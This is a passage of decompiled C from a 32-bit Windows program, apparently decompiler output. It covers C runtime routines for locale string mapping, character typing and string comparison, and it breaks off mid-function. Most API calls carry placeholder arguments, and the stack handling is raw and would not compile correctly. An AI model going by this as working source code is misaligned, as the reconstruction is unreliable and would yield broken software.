                    result = v3 + 1 + *v13;
                    return result;
                }
            }
        }
        // 0x406d2e
        v9 += 4;
        v11 = (int32_t *)v9;
        v12 = *v11;
        result = 0;
    }
  lab_0x406d3d:
    // 0x406d3d
    return result;
}

// Address range: 0x406d41 - 0x406f65
int32_t function_406d41(int32_t a1, int32_t a2, char * a3, int32_t a4, int32_t * a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x406d56
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g134; // 0x406d6f
    int32_t v3; // bp-60, 0x406d41
    int32_t * v4 = &v3; // 0x406d6f
    if (g134 == 0) {
        int32_t v5 = 0; // bp-84, 0x406d82
        if (LCMapStringW(0, 256, (int16_t *)&g3, 1, NULL, 0) == 0) {
            int32_t v6 = 0; // bp-108, 0x406d9e
            if (LCMapStringA(0, 256, (char *)&g2, 1, NULL, 0) == 0) {
                // 0x406ed1
                __writefsdword(0, v1);
                return 0;
            }
            // 0x406dad
            g134 = 2;
            v2 = 2;
            v4 = &v6;
        } else {
            // 0x406d8d
            g134 = 1;
            v2 = 1;
            v4 = &v5;
        }
    }
    int32_t v7 = (int32_t)a5;
    int32_t v8 = (int32_t)v4;
    int32_t v9 = v2; // 0x406dba
    int32_t v10 = v7; // 0x406dba
    if (a5 > NULL) {
        // 0x406dbc
        *(int32_t *)(v8 - 4) = v7;
        *(int32_t *)(v8 - 8) = a4;
        v10 = function_406f65((int32_t)&g167, (int32_t)&g167);
        v9 = g134;
    }
    // 0x406dcc
    if (v9 == 2) {
        // 0x406dd6
        *(int32_t *)(v8 - 4) = a7;
        *(int32_t *)(v8 - 8) = a6;
        *(int32_t *)(v8 - 12) = v10;
        *(int32_t *)(v8 - 16) = a4;
        *(int32_t *)(v8 - 20) = a2;
        *(int32_t *)(v8 - 24) = a1;
        int32_t result = LCMapStringA((int32_t)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167); // 0x406de8
        // 0x406ed1
        __writefsdword(0, v1);
        return result;
    }
    // 0x406df3
    if (v9 != 1) {
        // 0x406ed1
        __writefsdword(0, v1);
        return 0;
    }
    int32_t v11 = a8 != 0 ? a8 : g132;
    *(int32_t *)(v8 - 4) = 0;
    *(int32_t *)(v8 - 8) = 0;
    *(int32_t *)(v8 - 12) = v10;
    *(int32_t *)(v8 - 16) = a4;
    *(int32_t *)(v8 - 20) = a9 == 0 ? 1 : 9;
    int32_t v12 = v8 - 24; // 0x406e1d
    *(int32_t *)v12 = v11;
    int32_t v13 = MultiByteToWideChar((int32_t)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167); // 0x406e20
    if (v13 == 0) {
        // 0x406ed1
        __writefsdword(0, v1);
        return 0;
    }
    // 0x406e33
    function_401900(v13);
    if (v12 == 0) {
        // 0x406ed1
        __writefsdword(0, v1);
        return 0;
    }
    // 0x406e69
    *(int32_t *)(v8 - 28) = v13;
    *(int32_t *)(v8 - 32) = v12;
    *(int32_t *)(v8 - 36) = v10;
    *(int32_t *)(v8 - 40) = a4;
    *(int32_t *)(v8 - 44) = 1;
    *(int32_t *)(v8 - 48) = v11;
    int32_t v14 = MultiByteToWideChar((int32_t)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167); // 0x406e78
    if (v14 == 0) {
        // 0x406ed1
        __writefsdword(0, v1);
        return 0;
    }
    // 0x406e82
    *(int32_t *)(v8 - 52) = 0;
    *(int32_t *)(v8 - 56) = 0;
    *(int32_t *)(v8 - 60) = v13;
    *(int32_t *)(v8 - 64) = v12;
    *(int32_t *)(v8 - 68) = a2;
    int32_t v15 = v8 - 72; // 0x406e8b
    *(int32_t *)v15 = a1;
    int32_t Locale = LCMapStringW((int32_t)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167); // 0x406e8e
    if (Locale == 0) {
        // 0x406ed1
        __writefsdword(0, v1);
        return 0;
    }
    int32_t result2; // 0x406d41
    if (((int32_t)a3 & 4) == 0) {
        // 0x406ee3
        function_401900(Locale);
        if (v15 == 0) {
            // 0x406ed1
            __writefsdword(0, v1);
            return 0;
        }
        // 0x406f1b
        *(int32_t *)(v8 - 76) = Locale;
        *(int32_t *)(v8 - 80) = v15;
        *(int32_t *)(v8 - 84) = v13;
        *(int32_t *)(v8 - 88) = v12;
        *(int32_t *)(v8 - 92) = a2;
        *(int32_t *)(v8 - 96) = a1;
        int32_t v16 = LCMapStringW((int32_t)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167); // 0x406f29
        if (v16 == 0) {
            // 0x406ed1
            __writefsdword(0, v1);
            return 0;
        }
        // 0x406f33
        *(int32_t *)(v8 - 100) = 0;
        *(int32_t *)(v8 - 104) = 0;
        int32_t * v17 = (int32_t *)(v8 - 108);
        int32_t v18; // 0x406d41
        if (a7 != 0) {
            // 0x406f3e
            *v17 = a7;
            int32_t v19 = v8 - 112; // 0x406f41
            *(int32_t *)v19 = a6;
            v18 = v19;
        } else {
            // 0x406f3a
            *v17 = 0;
            int32_t v20 = v8 - 112; // 0x406f3b
            *(int32_t *)v20 = 0;
            v18 = v20;
        }
        // 0x406f44
        *(int32_t *)(v18 - 4) = Locale;
        *(int32_t *)(v18 - 8) = v15;
        *(int32_t *)(v18 - 12) = 544;
        *(int32_t *)(v18 - 16) = v11;
        int32_t v21 = WideCharToMultiByte((int32_t)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (char *)&g167, (bool *)&g167); // 0x406f4e
        result2 = v21;
        if (v21 == 0) {
            // 0x406ed1
            __writefsdword(0, v1);
            return 0;
        }
    } else {
        // 0x406ea3
        result2 = Locale;
        if (a7 != 0) {
            // 0x406eac
            if (Locale > a7) {
                // 0x406ed1
                __writefsdword(0, v1);
                return 0;
            }
            // 0x406eb1
            *(int32_t *)(v8 - 76) = a7;
            *(int32_t *)(v8 - 80) = a6;
            *(int32_t *)(v8 - 84) = v13;
            *(int32_t *)(v8 - 88) = v12;
            *(int32_t *)(v8 - 92) = a2;
            *(int32_t *)(v8 - 96) = a1;
            int32_t v22 = LCMapStringW(Locale, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167); // 0x406ec1
            result2 = Locale;
            if (v22 == 0) {
                // 0x406ed1
                __writefsdword(0, v1);
                return 0;
            }
        }
    }
    // 0x406ed1
    __writefsdword(0, v1);
    return result2;
}

// Address range: 0x406f65 - 0x406f90
int32_t function_406f65(int32_t a1, int32_t result) {
    int32_t v1 = a1; // 0x406f73
    int32_t v2 = result; // 0x406f73
    int32_t v3 = a1; // 0x406f73
    if (result != 0) {
        v3 = v1;
        while (*(char *)v1 != 0) {
            // 0x406f7a
            v2--;
            v1++;
            v3 = v1;
            if (v2 == 0) {
                // break -> 0x406f82
                break;
            }
            v3 = v1;
        }
    }
    // 0x406f82
    if (*(char *)v3 != 0) {
        // 0x406f8d
        return result;
    }
    // 0x406f88
    return v3 - a1;
}

// Address range: 0x406f90 - 0x4070d9
int32_t function_406f90(int32_t a1, char * a2, int32_t a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x406fa5
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g135; // 0x406fbf
    int32_t v3; // bp-56, 0x406f90
    int32_t * v4 = &v3; // 0x406fbf
    if (g135 == 0) {
        int32_t v5 = 1; // bp-72, 0x406fce
        int32_t lpCharType; // bp-32, 0x406f90
        bool v6 = GetStringTypeW(1, (int16_t *)&g3, 1, (int16_t *)&lpCharType); // 0x406fcf
        int32_t v7 = 1; // 0x406fd7
        v4 = &v5;
        if (!v6) {
            int32_t v8 = 0; // bp-92, 0x406fe8
            bool v9 = GetStringTypeA(0, 1, (char *)&g2, 1, (int16_t *)&lpCharType); // 0x406fe9
            v7 = 2;
            v4 = &v8;
            if (!v9) {
                // 0x4070c7
                __writefsdword(0, v1);
                return 0;
            }
        }
        // 0x406ffa
        v2 = v7;
        g135 = v2;
    }
    int32_t v10 = (int32_t)a4;
    int32_t v11 = (int32_t)v4;
    if (v2 == 2) {
        // 0x407004
        *(int32_t *)(v11 - 4) = v10;
        *(int32_t *)(v11 - 8) = a3;
        *(int32_t *)(v11 - 12) = (int32_t)a2;
        *(int32_t *)(v11 - 16) = a1;
        *(int32_t *)(v11 - 20) = a6 != 0 ? a6 : g131;
        bool result = GetStringTypeA((int32_t)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (int16_t *)&g167); // 0x40701d
        // 0x4070c7
        __writefsdword(0, v1);
        return result;
    }
    // 0x407028
    if (v2 != 1) {
        // 0x4070c7
        __writefsdword(0, v1);
        return 0;
    }
    int32_t v12 = a5 != 0 ? a5 : g132;
    *(int32_t *)(v11 - 4) = 0;
    *(int32_t *)(v11 - 8) = 0;
    *(int32_t *)(v11 - 12) = a3;
    int32_t v13 = (int32_t)a2; // 0x407043
    *(int32_t *)(v11 - 16) = v13;
    *(int32_t *)(v11 - 20) = a7 == 0 ? 1 : 9;
    int32_t v14 = v11 - 24; // 0x407052
    *(int32_t *)v14 = v12;
    int32_t v15 = MultiByteToWideChar((int32_t)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167); // 0x407055
    if (v15 == 0) {
        // 0x4070c7
        __writefsdword(0, v1);
        return 0;
    }
    // 0x407062
    function_401900(v15);
    int32_t * v16 = (int32_t *)(v11 - 28); // 0x40707c
    *v16 = 2 * v15;
    int32_t * v17 = (int32_t *)(v11 - 32); // 0x40707d
    *v17 = 0;
    int32_t * v18 = (int32_t *)(v11 - 36); // 0x40707e
    *v18 = v14;
    function_4066d0(v14, (int32_t)&g167, (int32_t)&g167);
    if (v14 == 0) {
        // 0x4070c7
        __writefsdword(0, v1);
        return 0;
    }
    // 0x40709c
    *v16 = v15;
    *v17 = v14;
    *v18 = a3;
    *(int32_t *)(v11 - 40) = v13;
    *(int32_t *)(v11 - 44) = 1;
    *(int32_t *)(v11 - 48) = v12;
    int32_t v19 = MultiByteToWideChar(-1, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167); // 0x4070ab
    int32_t result2 = 0; // 0x4070b3
    if (v19 != 0) {
        // 0x4070b5
        *(int32_t *)(v11 - 52) = v10;
        *(int32_t *)(v11 - 56) = v19;
        *(int32_t *)(v11 - 60) = v14;
        *(int32_t *)(v11 - 64) = a1;
        bool v20 = GetStringTypeW((int32_t)&g167, (int16_t *)&g167, (int32_t)&g167, (int16_t *)&g167); // 0x4070bd
        result2 = v20;
    }
    // 0x4070c7
    __writefsdword(0, v1);
    return result2;
}

// Address range: 0x4070e0 - 0x40711e
int32_t function_4070e0(int32_t a1, int32_t a2) {
    char v1 = *(char *)a2; // 0x4070f4
    int32_t v2 = 0; // 0x4070f8
    int32_t v3 = a2; // 0x4070f8
    int32_t v4 = 0; // 0x4070f8
    if (v1 != 0) {
        v3++;
        v4 |= 1 << (int32_t)(v1 & 31);
        char v5 = *(char *)v3; // 0x4070f4
        v2 = v4;
        while (v5 != 0) {
            // 0x4070fa
            v3++;
            v4 |= 1 << (int32_t)(v5 & 31);
            v5 = *(char *)v3;
            v2 = v4;
        }
    }
    int32_t result = -1; // 0x407108
    int32_t v6 = a1; // 0x4070e0
    result++;
    char v7 = *(char *)v6; // 0x407109
    while (v7 != 0) {
        // 0x40710f
        v6++;
        if ((1 << (int32_t)(v7 & 31) & v2) != 0) {
            // break -> 0x407116
            break;
        }
        result++;
        v7 = *(char *)v6;
    }
    // 0x407116
    return result;
}

// Address range: 0x407120 - 0x407158
int32_t function_407120(int32_t a1, int32_t a2, int32_t a3) {
    // 0x407120
    if (a3 == 0) {
        // 0x407151
        return 0;
    }
    // 0x40712b
    bool v1; // 0x407120
    int32_t v2 = v1 ? -1 : 1;
    int32_t v3 = a3; // 0x407134
    int32_t v4 = a1; // 0x407120
    int32_t v5 = 0; // 0x407134
    while (v3 != 0) {
        int32_t v6 = v4;
        v3--;
        v4 = v6 + v2;
        v5 = v3;
        if (*(char *)v6 == 0) {
            // break ->
            break;
        }
        v5 = 0;
    }
    int32_t v7 = a3 - v5; // 0x40713f
    int32_t v8 = a1;
    int32_t v9 = a2;
    int32_t v10 = v9; // 0x40713f
    int32_t v11 = v8; // 0x40713f
    while (v7 != 0) {
        int32_t v12 = v8 + v2; // 0x40713f
        int32_t v13 = v9 + v2; // 0x40713f
        v7--;
        v10 = v13;
        v11 = v12;
        if (*(char *)v9 != *(char *)v8) {
            // break ->
            break;
        }
        v8 = v12;
        v9 = v13;
        v10 = v9;
        v11 = v8;
    }
    unsigned char v14 = *(char *)(v10 - 1); // 0x407141
    unsigned char v15 = *(char *)(v11 - 1); // 0x407146
    int32_t result = -1; // 0x407149
    if (v14 <= v15) {
        // 0x40714b
        result = 1;
        if (v14 == v15) {
            // 0x407151
            return 0;
        }
    }
    // 0x407151
    return result;
}

// Address range: 0x407160 - 0x40719a
int32_t function_407160(int32_t a1, int32_t a2) {
    unsigned char v1 = *(char *)a2; // 0x407174
    int32_t v2 = v1; // 0x407176
    int32_t v3 = 0; // 0x407178
    int32_t v4 = 0; // 0x407178
    int32_t v5 = v2; // 0x407178
    int32_t v6 = a2; // 0x407178
    int32_t v7 = 0; // 0x407178
    if (v1 != 0) {
        v6++;
        v7 |= 1 << (v2 & 31);
        unsigned char v8 = *(char *)v6; // 0x407174
        int32_t v9 = v8; // 0x407176
        v5 = v5 & -256 | v9;
        v3 = v7;
        v4 = v5;
        while (v8 != 0) {
            // 0x40717a
            v6++;
            v7 |= 1 << (v9 & 31);
            v8 = *(char *)v6;
            v9 = v8;
            v5 = v5 & -256 | v9;
            v3 = v7;
            v4 = v5;
        }
    }
    int32_t v10 = v4; // 0x407186
    int32_t v11 = a1;
    unsigned char v12 = *(char *)v11; // 0x407184
    int32_t v13 = v12; // 0x407186
    v10 = v10 & -256 | v13;
    int32_t result = v10; // 0x407188
    while (v12 != 0) {
        // 0x40718a
        result = v11;
        if ((1 << (v13 & 31) & v3) != 0) {
            // break -> 0x407194
            break;
        }
        v11++;
        v12 = *(char *)v11;
        v13 = v12;
        v10 = v10 & -256 | v13;
        result = v10;
    }
    // 0x407194
    return result;
}

// Address range: 0x40719a - 0x4071fb
int32_t function_40719a(int32_t a1, int32_t a2) {
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x4071af
    char * v2 = (char *)(36 * (a1 & 31) + 4 + v1); // 0x4071ba
    unsigned char v3 = *v2; // 0x4071ba
    if (a2 == 0x8000) {
        // 0x4071dd
        *v2 = v3 & 127;
        return v3 > 255 ? 0x8000 : 0x4000;
    }
    if (a2 != 0x4000) {
        // 0x4071eb
        *(int32_t *)function_404bb7() = 22;
        return -1;
    }
    // 0x4071dd
    *v2 = v3 | -128;
    return v3 > -1 ? 0x8000 : 0x4000;
}

// Address range: 0x4071fb - 0x407270
int32_t function_4071fb(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a2;
    if (a1 < 256) {
        // 0x40726b
        return (int32_t)*(int16_t *)(g35 + 2 * a1) & a3;
    }
    int32_t v2 = a1 / 256; // 0x407222
    char v3 = *(char *)(g35 + (2 * v2 & 510 | 1)); // 0x407228
    int32_t v4 = 0x1000000 * (v3 > -1 ? a1 : v2) / 0x1000000;
    int32_t result = function_406f90(1, (char *)&v4, v3 > -1 ? 1 : 2, &v1, 0, 0, 1); // 0x407259
    if (result == 0) {
        // 0x407265
        return result;
    }
    // 0x40726b
    return v1 & 0xffff & a3;
}

// Address range: 0x4072e3 - 0x407351
int32_t function_4072e3(void) {
    int32_t v1 = *(int32_t *)g88; // 0x4072f0
    if (v1 == 0) {
        // 0x407346
        return 0;
    }
    int32_t v2 = g88; // 0x407338
    int32_t v3; // bp-20, 0x4072e3
    int32_t v4 = &v3;
    *(int32_t *)(v4 - 4) = 0;
    *(int32_t *)(v4 - 8) = 0;
    *(int32_t *)(v4 - 12) = 0;
    int32_t * v5 = (int32_t *)(v4 - 16); // 0x4072ff
    *v5 = 0;
    *(int32_t *)(v4 - 20) = -1;
    *(int32_t *)(v4 - 24) = v1;
    *(int32_t *)(v4 - 28) = 0;
    *(int32_t *)(v4 - 32) = 1;
    int32_t v6 = WideCharToMultiByte((int32_t)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (char *)&g167, (bool *)&g167); // 0x407306
    int32_t result = -1; // 0x40730c
    while (v6 != 0) {
        int32_t * v7 = (int32_t *)(v4 - 36); // 0x40730e
        *v7 = v6;
        int32_t * v8 = _malloc((int32_t)&g167); // 0x40730f
        int32_t v9 = (int32_t)v8; // 0x40730f
        *v5 = v9;
        result = -1;
        if (v8 == NULL) {
            // break -> 0x407346
            break;
        }
        // 0x40731d
        *v7 = 0;
        *(int32_t *)(v4 - 40) = 0;
        *(int32_t *)(v4 - 44) = v6;
        int32_t * v10 = (int32_t *)(v4 - 48); // 0x407320
        *v10 = v9;
        *(int32_t *)(v4 - 52) = -1;
        *(int32_t *)(v4 - 56) = *(int32_t *)v2;
        *(int32_t *)(v4 - 60) = 0;
        int32_t v11 = v4 - 64; // 0x407326
        *(int32_t *)v11 = 1;
        int32_t v12 = WideCharToMultiByte((int32_t)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (char *)&g167, (bool *)&g167); // 0x407328
        result = -1;
        if (v12 == 0) {
            // break -> 0x407346
            break;
        }
        // 0x40732e
        *(int32_t *)(v4 - 68) = 0;
        *(int32_t *)(v4 - 72) = *v10;
        function_4077ae((int32_t)&g167, (int32_t)&g167);
        v2 += 4;
        int32_t v13 = *(int32_t *)v2; // 0x407338
        result = 0;
        if (v13 == 0) {
            // break -> 0x407346
            break;
        }
        v4 = v11;
        *(int32_t *)(v4 - 4) = 0;
        *(int32_t *)(v4 - 8) = 0;
        *(int32_t *)(v4 - 12) = 0;
        v5 = (int32_t *)(v4 - 16);
        *v5 = 0;
        *(int32_t *)(v4 - 20) = -1;
        *(int32_t *)(v4 - 24) = v13;
        *(int32_t *)(v4 - 28) = 0;
        *(int32_t *)(v4 - 32) = 1;
        v6 = WideCharToMultiByte((int32_t)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (char *)&g167, (bool *)&g167);
        result = -1;
    }
    // 0x407346
    return result;
}

// Address range: 0x407360 - 0x407430
int32_t function_407360(int32_t a1, int32_t a2) {
    int32_t v1 = (int32_t)&g130 | 255; // 0x407376
    int32_t v2 = a2; // 0x407376
    int32_t v3 = a1; // 0x407376
    if (g131 == 0) {
        int32_t v4; // 0x407360
        while (true) {
            // 0x40737c
            v4 = v1;
            if ((char)v1 == 0) {
                return 0x1000000 * v4 / 0x1000000;
            }
            unsigned char v5 = *(char *)v2; // 0x407380
            v2++;
            unsigned char v6 = *(char *)v3; // 0x407383
            int32_t v7 = v6; // 0x407383
            int32_t v8 = 256 * v7 | (int32_t)v5; // 0x407383
            v3++;
            int32_t v9 = v8; // 0x407388
            int32_t v10 = v2; // 0x407388
            int32_t v11 = v3; // 0x407388
            while (v5 == v6) {
                // 0x40737c
                v4 = v9;
                if ((char)v9 == 0) {
                    return 0x1000000 * v4 / 0x1000000;
                }
                // 0x407380
                v5 = *(char *)v10;
                v2 = v10 + 1;
                v6 = *(char *)v11;
                v7 = v6;
                v8 = 256 * v7 | (int32_t)v5;
                v3 = v11 + 1;
                v9 = v8;
                v10 = v2;
                v11 = v3;
            }
            int32_t v12 = v8 + 191; // 0x40738a
            int32_t v13 = (char)v12 < 26 ? 32 : 0; // 0x40738e
            int32_t v14 = (v13 - (v13 | (int32_t)(v6 < 91)) & 32) + (v7 | 256); // 0x4073a4
            unsigned char v15 = (char)v14;
            unsigned char v16 = (char)((256 * (v13 + v12) + 0x4100) / 256);
            v1 = v14 & 255;
            if (v15 != v16) {
                char v17 = v15 < v16; // 0x4073aa
                unsigned char v18 = v17 + v15; // 0x4073aa
                char v19 = v15 < v16; // 0x4073aa
                bool v20 = v15 < v16 ? v19 - v17 > v15 | v18 != -1 : v18 > v15; // 0x4073aa
                v4 = (char)!v20 + v19;
                return 0x1000000 * v4 / 0x1000000;
            }
        }
      lab_0x4073ae:
        // 0x40742b
        return 0x1000000 * v4 / 0x1000000;
    }
    int32_t v21 = g138; // 0x4073b3
    g138 = v21 + 1;
    int32_t v22 = g137; // 0x4073ba
    int32_t v23 = 0; // 0x4073c1
    int32_t v24; // bp-20, 0x407360
    if (v22 >= 0 == (v22 != 0)) {
        // 0x4073c7
        g138 = v21;
        v24 = 19;
        function_403cab(19);
        v23 = 1;
    }
    // 0x4073dc
    v24 = v23;
    int32_t v25 = &v24;
    int32_t v26 = a1; // 0x407360
    int32_t v27 = a2; // 0x407360
    unsigned char v28 = *(char *)v27; // 0x4073e8
    int32_t v29 = v28; // 0x4073e8
    unsigned char v30 = *(char *)v26; // 0x4073eb
    int32_t v31 = v30; // 0x4073eb
    uint32_t v32 = v29; // 0x4073f0
    int32_t v33 = v31; // 0x4073f0
    int32_t result; // 0x407360
    unsigned char v34; // 0x407360
    unsigned char v35; // 0x407360
    int32_t v36; // 0x40740a
    uint32_t v37; // 0x40740a
    int32_t v38; // 0x40740a
    bool v39; // 0x40740a
    if (v28 != v30) {
        // 0x4073f2
        *(int32_t *)(v25 - 4) = v29;
        *(int32_t *)(v25 - 8) = v31;
        v33 = function_4079f4((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
        v32 = function_4079f4((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
        v34 = (char)v33;
        v35 = (char)v32;
        if (v34 != v35) {
            // 0x40740a
            v36 = v34 < v35;
            v37 = v32 + v36;
            v38 = v34 < v35;
            v39 = v34 < v35 ? v32 < v38 - v36 | v37 != -1 : v32 < v37;
            result = (int32_t)!v39 + v38;
            goto lab_0x40740f;
        }
    }
    int32_t v40 = v32;
    v26++;
    v27++;
    result = v40;
    while ((char)v40 != 0) {
        // 0x4073e8
        v28 = *(char *)v27;
        v29 = v40 & -256 | (int32_t)v28;
        v30 = *(char *)v26;
        v31 = v33 & -256 | (int32_t)v30;
        int32_t v41 = v29; // 0x4073f0
        v33 = v31;
        if (v28 != v30) {
            // 0x4073f2
            *(int32_t *)(v25 - 4) = v29;
            *(int32_t *)(v25 - 8) = v31;
            v33 = function_4079f4((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
            v32 = function_4079f4((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
            v34 = (char)v33;
            v35 = (char)v32;
            v41 = v32;
            if (v34 != v35) {
                // 0x40740a
                v36 = v34 < v35;
                v37 = v32 + v36;
                v38 = v34 < v35;
                v39 = v34 < v35 ? v32 < v38 - v36 | v37 != -1 : v32 < v37;
                result = (int32_t)!v39 + v38;
                goto lab_0x40740f;
            }
        }
        // 0x4073e4
        v40 = v41;
        v26++;
        v27++;
        result = v40;
    }
    goto lab_0x40740f;
  lab_0x40740f:
    // 0x40740f
    if (v24 != 0) {
        // 0x40741f
        v24 = 19;
        function_403d0c((int32_t)&g167);
    } else {
        // 0x407416
        g138--;
    }
    // 0x40742b
    return result;
}

// Address range: 0x407430 - 0x407531
int32_t function_407430(int32_t a1, int32_t a2, int32_t a3) {
    // 0x407430
    if (a3 == 0) {
        // 0x40752a
        return 0;
    }
    // 0x407441
    if (g131 == 0) {
        int32_t v1 = a3; // 0x407459
        int32_t v2 = a1; // 0x407459
        int32_t v3 = a2; // 0x407459
        unsigned char v4 = *(char *)v2; // 0x40745c
        char v5 = *(char *)v3; // 0x407460
        char v6 = v5; // 0x407462
        char v7 = v4; // 0x407462
        bool v8; // 0x407430
        while (v4 != 0 && v5 != 0) {
            int32_t v9 = 256 * (int32_t)v4; // 0x40745e
            char v10 = v5 > 90 ? v5 : v5 + 32;
            int32_t v11; // 0x407430
            char v12 = (v4 > 90 ? v9 : v9 + (v11 & 255 | 0x2000) & 0xff00) / 256;
            if (v10 != v12) {
                // 0x40748f
                v8 = v10 > v12;
                return v8 ? -1 : 1;
            }
            // 0x407482
            v1--;
            v2++;
            v3++;
            v6 = v10;
            v7 = v12;
            if (v1 == 0) {
                // break -> 0x407485
                break;
            }
            v4 = *(char *)v2;
            v5 = *(char *)v3;
            v6 = v5;
            v7 = v4;
        }
        // 0x407485
        v8 = v7 < v6;
        if (v7 == v6) {
            // 0x40752a
            return 0;
        }
      lab_0x40748f_2:
        // 0x40748f
        return v8 ? -1 : 1;
    }
    int32_t v13 = g138; // 0x4074a1
    g138 = v13 + 1;
    int32_t v14 = g137; // 0x4074a8
    int32_t v15 = 0; // 0x4074af
    int32_t v16; // bp-20, 0x407430
    if (v14 >= 0 == (v14 != 0)) {
        // 0x4074b5
        g138 = v13;
        v16 = 19;
        function_403cab(19);
        v15 = 1;
    }
    // 0x4074ce
    v16 = v15;
    int32_t v17 = &v16;
    int32_t * v18 = (int32_t *)(v17 - 4);
    int32_t v19 = a3; // 0x4074d2
    int32_t v20 = a1; // 0x4074d2
    int32_t v21 = a2; // 0x4074d2
    int32_t v22 = (int32_t)*(char *)v20; // 0x4074d4
    int32_t v23 = (int32_t)*(char *)v21; // 0x4074d8
    int32_t v24 = v22; // 0x4074da
    int32_t v25 = v23; // 0x4074da
    bool v26; // 0x407430
    while (v22 != 0 && v23 != 0) {
        // 0x4074e0
        *v18 = v19;
        *(int32_t *)(v17 - 8) = v22;
        *(int32_t *)(v17 - 12) = v23;
        int32_t v27 = function_4079f4((int32_t)&g167, (int32_t)&g167, (int32_t)&g167); // 0x4074e5
        int32_t v28 = function_4079f4((int32_t)&g167, (int32_t)&g167, (int32_t)&g167); // 0x4074ef
        if (v28 != v27) {
            // 0x407505
            v26 = v28 < v27;
            goto lab_0x407505_2;
        }
        // 0x4074fc
        v19 = *v18 - 1;
        v20++;
        v21++;
        v24 = v28;
        v25 = v27;
        if (v19 == 0) {
            // break -> 0x4074ff
            break;
        }
        v22 = v28 & -256 | (int32_t)*(char *)v20;
        v23 = v27 & -256 | (int32_t)*(char *)v21;
        v24 = v22;
        v25 = v23;
    }
    // 0x4074ff
    v26 = v24 < v25;
    int32_t result = 0; // 0x407503
    if (v24 == v25) {
        goto lab_0x40750e;
    } else {
        goto lab_0x407505_2;
    }
  lab_0x40750e:
    // 0x40750e
    if (v16 != 0) {
        // 0x40751c
        v16 = 19;
        function_403d0c((int32_t)&g167);
    } else {
        // 0x407513
        g138--;
    }
    // 0x40752a
    return result;
  lab_0x407505_2:
    // 0x407505
    result = v26 ? -1 : 1;
    goto lab_0x40750e;
}

// Address range: 0x407531 - 0x4077ae
int32_t ___crtCompareStringA(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x407546
    __writefsdword(0, (int32_t)&v1);
    int32_t v2; // bp-80, 0x407531
    int32_t * v3 = &v2; // 0x407562
    if (g136 == 0) {
        int32_t v4 = 0; // bp-104, 0x40756e
        int32_t v5 = CompareStringW(0, 0, (int16_t *)&g3, 1, (int16_t *)&g3, 1); // 0x40756f
        if (v5 == 0) {
            int32_t v6 = 0; // bp-128, 0x40758b
            if (CompareStringA(0, 0, (char *)&g2, 1, (char *)&g2, 1) == 0) {
                // 0x40779c
                __writefsdword(0, v1);
                return 0;
            }
            // 0x40759a
            g136 = 2;
            v3 = &v6;
        } else {
            // 0x407579
            g136 = 1;
            v3 = &v4;
        }
    }
    int32_t v7 = (int32_t)v3;
    int32_t v8 = a4; // 0x4075a9
    if (a4 > 0) {
        // 0x4075ab
        *(int32_t *)(v7 - 4) = a4;
        *(int32_t *)(v7 - 8) = a3;
        v8 = function_406f65((int32_t)&g167, (int32_t)&g167);
    }
    int32_t v9 = a6; // 0x4075be
    if (a6 > 0) {
        // 0x4075c0
        *(int32_t *)(v7 - 4) = a6;
        *(int32_t *)(v7 - 8) = a5;
        v9 = function_406f65((int32_t)&g167, (int32_t)&g167);
    }
    // 0x4075d0
    if (g136 == 2) {
        // 0x4075da
        *(int32_t *)(v7 - 4) = v9;
        *(int32_t *)(v7 - 8) = a5;
        *(int32_t *)(v7 - 12) = v8;
        *(int32_t *)(v7 - 16) = a3;
        *(int32_t *)(v7 - 20) = a2;
        *(int32_t *)(v7 - 24) = a1;
        int32_t result = CompareStringA((int32_t)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167); // 0x4075ea
        // 0x40779c
        __writefsdword(0, v1);
        return result;
    }
    // 0x4075f5
    if (g136 != 1) {
        // 0x40779c
        __writefsdword(0, v1);
        return 0;
    }
    int32_t v10 = a7 != 0 ? a7 : g132;
    int32_t v11 = v7; // 0x40760c
    int32_t v12; // 0x407531
    if (v8 != 0 == (v9 != 0)) {
        goto lab_0x4076af;
    } else {
        int32_t v13 = v7; // 0x40761a
        if (v8 == v9) {
          lab_0x40761c_2:
            // 0x40761c
            *(int32_t *)(v13 - 4) = 2;
            // 0x40779c
            __writefsdword(0, v1);
            return 2;
        }
        // 0x407624
        if (v9 > 1) {
            // 0x40779c
            __writefsdword(0, v1);
            return 1;
        }
        // 0x407630
        v12 = v7;
        if (v8 > 1) {
            goto lab_0x407675;
        } else {
            // 0x407634
            int32_t v14; // bp-64, 0x407531
            *(int32_t *)(v7 - 4) = (int32_t)&v14;
            v11 = v7 - 8;
